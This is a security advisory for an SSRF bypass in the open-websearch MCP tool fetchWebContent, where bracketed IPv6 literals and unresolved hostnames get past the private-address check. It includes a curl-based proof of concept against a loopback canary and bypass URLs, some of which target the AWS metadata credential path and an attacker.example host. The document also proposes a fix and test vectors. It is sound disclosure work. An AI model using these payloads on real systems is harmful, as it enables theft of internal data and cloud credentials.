# [H] open-websearch has SSRF in `fetchWebContent` MCP tool: bracketed IPv6 literals and non-resolving hostname check bypass `isPrivateOrLocalHostname`

## Summary
Severity: High
Advisory: GHSA-v228-72c7-fx8j
CVE: CVE-2026-42260
CWE: CWE-20, CWE-693, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-v228-72c7-fx8j
Type: github-advisory

## Affected
- npm: `open-websearch` — affected >=0 <2.1.7

## Details
### Summary
`src/utils/urlSafety.ts` exposes `isPublicHttpUrl` / `assertPublicHttpUrl`, used to gate the MCP `fetchWebContent` tool against private-network targets. The check has two defects that together allow **non-blind SSRF with the response body returned to the caller**:

1. **Bracketed IPv6 literals are never recognized.** Node's WHATWG `URL.hostname` keeps the surrounding `[…]` for IPv6 literals. `isIP("[::1]")` returns 0 (not 6), so neither `isPrivateIpv4` nor `isPrivateIpv6` is ever called on an IPv6 literal input — including `[::1]` itself, and including every IPv4-mapped form such as `[::ffff:7f00:1]` (= 127.0.0.1 via the IPv4 stack).
2. **No DNS resolution.** `isPrivateOrLocalHostname` only inspects the literal `hostname` string. It never resolves the host to an IP. Any attacker-controlled hostname whose DNS record points at 127.0.0.1 (or any RFC1918 / link-local address) passes the check unchanged, and `axios` then performs its own resolution and connects to the private address.

The `isPrivateIpv6` implementation also has the hex bypass (it would miss `::ffff:7f00:1` even if reached) but defect (1) makes every bracketed IPv6 literal slip past before that branch is even entered.

The `fetchWebContent` tool returns the response body (`JSON.stringify(result)`) to the MCP caller, so the SSRF is non-blind.

### Details
<!-- obsidian --><p><strong>Vulnerable function</strong> — <code>src/utils/urlSafety.ts:95-119</code>:</p>
<pre><code class="language-ts">export function isPrivateOrLocalHostname(hostname: string): boolean {
  const host = hostname.trim().toLowerCase();
  if (!host) return true;
  if (host === 'localhost' || host.endsWith('.localhost')) return true;
  if (host === 'metadata.google.internal' || host === 'metadata.azure.internal') return true;
  const integerIp = parseIntegerIpv4Literal(host);
  if (integerIp &#x26;&#x26; isPrivateIpv4(integerIp)) return true;
  if (isPrivateOrLocalIp(host)) return true;   // only runs if isIP(host) ∈ {4, 6}
  return false;
}
</code></pre>
<p><code>isPrivateOrLocalIp</code> — <code>src/utils/urlSafety.ts:84-93</code>:</p>
<pre><code class="language-ts">function isPrivateOrLocalIp(ip: string): boolean {
  const version = isIP(ip);  // returns 0 for "[::1]", "[::ffff:7f00:1]", any bracketed literal
  if (version === 4) return isPrivateIpv4(ip);
  if (version === 6) return isPrivateIpv6(ip);
  return false;
}
</code></pre>
<p>Caller — <code>src/tools/setupTools.ts:252-286</code> (<code>fetchWebContent</code> tool):</p>
<pre><code class="language-ts">server.tool(
  fetchWebToolName,  // default: "fetchWebContent"
  "Fetch content from a public HTTP(S) URL ...",
  { url: z.string().url().refine(
      (url) => validatePublicWebUrl(url),   // → isPublicHttpUrl → isPrivateOrLocalHostname
      "URL must be a public HTTP(S) address ..."
    ), /* … */ },
  async ({url, maxChars}) => {
    const result = await runtime.services.fetchWeb.execute({ url, maxChars, /*…*/ });
    return { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] };
  }
);
</code></pre>
<p>Service — <code>src/engines/web/fetchWebContent.ts:313-375</code>: re-validates via <code>assertPublicHttpUrl</code> (same broken check), then calls <code>axios.head</code> + <code>axios.get</code> on the raw URL and returns <code>response.data</code> and <code>response.headers</code> to the caller.</p>
<p>Transport — <code>src/index.ts:85-253</code>: when <code>config.enableHttpServer</code> is true (documented configuration; enabled by the Docker image), the MCP server binds on <code>0.0.0.0:${PORT}</code> (default <code>3000</code>) with CORS <code>origin: '*'</code> and <strong>no authentication</strong> on <code>/mcp</code> (Streamable HTTP) or <code>/sse</code> (legacy SSE). Anyone who can reach the port can invoke any tool.</p>
<h3 data-heading="Verification of the validator (run against current &#x60;HEAD&#x60;)">Verification of the validator (run against current <code>HEAD</code>)</h3>
<p>I executed the real <code>isPublicHttpUrl</code> / <code>assertPublicHttpUrl</code> from <code>src/utils/urlSafety.ts</code> under <code>tsx</code> against a set of inputs:</p>

Input URL | parsed.hostname | isPublicHttpUrl | assertPublicHttpUrl
-- | -- | -- | --
http://[::ffff:7f00:1]/ (127.0.0.1) | [::ffff:7f00:1] | true ← bypass | PASSED ← bypass
http://[::ffff:a9fe:1]/ (169.254.0.1) | [::ffff:a9fe:1] | true ← bypass | PASSED ← bypass
http://[::ffff:a00:1]/ (10.0.0.1) | [::ffff:a00:1] | true ← bypass | PASSED ← bypass
http://[::ffff:127.0.0.1]/ | [::ffff:7f00:1] | true ← bypass | PASSED ← bypass
http://[0:0:0:0:0:0:0:1]/ | [::1] | true ← bypass | PASSED ← bypass
http://[::1]/ (plain loopback!) | [::1] | true ← bypass | PASSED ← bypass
http://127.0.0.1/ (control) | 127.0.0.1 | false (blocked) | threw (blocked)
http://localhost/ (control) | localhost | false (blocked) | threw (blocked)


<p>WHATWG <code>new URL("http://[::ffff:127.0.0.1]/").hostname</code> returns <code>[::ffff:7f00:1]</code> — note that Node's URL parser actively re-encodes the dotted form to hex, helping the bypass. Every bracketed IPv6 literal passes the validator.</p>
<h3 data-heading="Verification of the fetch (Node 22/25)">Verification of the fetch (Node 22/25)</h3>
<p>I bound a trivial HTTP server to <code>127.0.0.1:29999</code> and called <code>axios.get("http://[::ffff:7f00:1]:29999/")</code> from Node; the request reached the server:</p>
<pre><code>  HIT: / from 127.0.0.1 family IPv4
http://[::ffff:7f00:1]:29999/ -> 200 &#x3C;html>internal content&#x3C;/html>
</code></pre>
<p>The OS routes <code>::ffff:X.X.X.X</code> connections through the IPv4 stack, so the PoC works identically across macOS and Linux.</p>

Environment: clean clone of `Aas-ee/open-webSearch@HEAD`, Node 22+.

**1. Start the MCP HTTP server.**

```bash
git clone https://github.com/Aas-ee/open-webSearch.git
cd open-webSearch
npm install && npm run build
MODE=http PORT=3000 node build/index.js &
```

**2. Stand up a canary on loopback.**

```bash
node -e '
  require("http").createServer((q,r)=>{
    console.log("[canary]", q.method, q.url, "from", q.socket.remoteAddress);
    r.writeHead(200, {"content-type":"text/html"});
    r.end("INTERNAL-SECRET: canary-hit for " + q.url);
  }).listen(19999, "127.0.0.1", () => console.log("canary on 127.0.0.1:19999"));
' &
```

**3. Open an MCP session and call `fetchWebContent` with the bypass URL.**

```bash
# Accept header must include both JSON and SSE for Streamable HTTP transport.
ACCEPT='application/json, text/event-stream'

# initialize → grab the mcp-session-id header
SID=$(curl -sSD - -o /dev/null -X POST http://127.0.0.1:3000/mcp \
  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"poc","version":"0"}}}' \
  | awk 'tolower($1)=="mcp-session-id:" { gsub(/\r/,""); print $2 }')

# notifications/initialized
curl -sS -X POST http://127.0.0.1:3000/mcp \
  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' -H "mcp-session-id: $SID" \
  -d '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}' >/dev/null

# call fetchWebContent with the SSRF bypass URL
curl -sS -X POST http://127.0.0.1:3000/mcp \
  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' -H "mcp-session-id: $SID" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{
        "name":"fetchWebContent",
        "arguments":{"url":"http://[::ffff:7f00:1]:19999/internal","maxChars":10000}
      }}'
```

Expected result: the canary logs `[canary] GET /internal from 127.0.0.1`, and the MCP response contains `INTERNAL-SECRET: canary-hit for /internal` in the tool's `content[0].text`.

Additional bypass vectors that work the same way:

- `http://[::1]:<port>/` — plain IPv6 loopback.
- `http://[::ffff:a9fe:1]/latest/meta-data/iam/security-credentials/` — AWS EC2 metadata over the IPv4 stack.
- `http://attacker.example/` where `attacker.example` has A/AAAA pointing at any private address — bypasses via defect (2), no IPv6 trick needed.

### Impact

- **Cross-tenant SSRF with full response body.** Any client that can speak MCP to the HTTP transport can fetch arbitrary private-network URLs and receive the response body. AWS EC2 metadata, internal dashboards, loopback services, RFC1918 neighbours — all in scope.
- **Pre-auth when `enableHttpServer` is set.** No authentication layer exists on `/mcp` or `/sse`; CORS is `*`.
- **DNS-rebinding / LAN-victim angle.** Because `/mcp` is CORS `*` and accepts `POST`, a victim who visits an attacker-controlled webpage while running open-webSearch locally will have their browser used to send tool-call requests, and the tool's response can be exfiltrated back via a simple XHR.
- **Exploitable over stdio too.** Even with HTTP disabled, a compromised or prompt-injected MCP client can call `fetchWebContent` against loopback on the host running the server — a realistic LLM-agent-abuse vector.

No meaningful mitigation in the call chain: only `http://` and `https://` schemes are accepted, but that is not a restriction for SSRF.

### Suggested fix

Two changes, either of which individually closes most of the gap; both together close it fully.

1. **Normalize the hostname before IP checks, and perform a DNS resolution.** Use the `ip-address` package or a similar canonicalizer, and reject any `getaddrinfo` result whose IP falls in a private CIDR. Keep a bracket-stripping step for IPv6 literals before calling `isIP()`.

    ```ts
    import { lookup } from 'node:dns/promises';
    import { Address4, Address6 } from 'ip-address';

    function stripBrackets(h: string): string {
      return h.startsWith('[') && h.endsWith(']') ? h.slice(1, -1) : h;
    }

    const BLOCKED_V6_CIDRS = [
      '::1/128', '::/128',
      'fc00::/7', 'fe80::/10',
      '2001:db8::/32', '2002::/16', '64:ff9b::/96',
      '100::/64', 'ff00::/8',
      '::ffff:0:0/96',   // IPv4-mapped — delegate to v4 check
    ];

    function ipv6IsPrivate(addr6: Address6): boolean {
      const v4 = addr6.to4();
      if (v4 && v4.isValid()) return isPrivateIpv4(v4.address);
      return BLOCKED_V6_CIDRS.some(cidr => addr6.isInSubnet(new Address6(cidr)));
    }

    export async function assertPublicHttpUrl(url: URL | string, label = 'URL') {
      const parsed = typeof url === 'string' ? new URL(url) : url;
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') throw …;
      const host = stripBrackets(parsed.hostname);

      // Literal IP case.
      const v = isIP(host);
      if (v === 4 && isPrivateIpv4(host)) throw …;
      if (v === 6 && ipv6IsPrivate(new Address6(host))) throw …;

      if (v === 0) {
        // Hostname — resolve and check every record.
        const records = await lookup(host, { all: true, verbatim: true });
        for (const r of records) {
          if (r.family === 4 && isPrivateIpv4(r.address)) throw …;
          if (r.family === 6 && ipv6IsPrivate(new Address6(r.address))) throw …;
        }
      }
    }
    ```

2. **Dual-pin the connection.** Even a perfect pre-connect check has TOCTOU gaps (DNS rebinding between check and `axios.get`). Use a custom `undici` `Agent` whose `connect` hook validates the actual connected socket IP via `socket.remoteAddress`. That closes the rebinding window.

3. **Gate the HTTP transport.** Require a bearer token (env var) on `/mcp` and `/sse`, and restrict binding to `127.0.0.1` by default. CORS `*` plus no-auth on `0.0.0.0` is the same exposure profile as an unauthenticated open proxy.

Test vectors to add to the suite:

```ts
for (const url of [
  'http://[::1]/', 'http://[::]/',
  'http://[::ffff:127.0.0.1]/', 'http://[::ffff:7f00:1]/',
  'http://[0:0:0:0:0:ffff:127.0.0.1]/',
  'http://[0:0:0:0:0:0:0:1]/', 'http://[::0:1]/', 'http://[0:0::1]/',
  'http://[::ffff:a00:1]/', 'http://[::ffff:c0a8:1]/', 'http://[::ffff:a9fe:1]/',
]) expect(isPublicHttpUrl(url)).toBe(false);

## References
- https://github.com/Aas-ee/open-webSearch/security/advisories/GHSA-v228-72c7-fx8j
- https://nvd.nist.gov/vuln/detail/CVE-2026-42260
- https://github.com/Aas-ee/open-webSearch
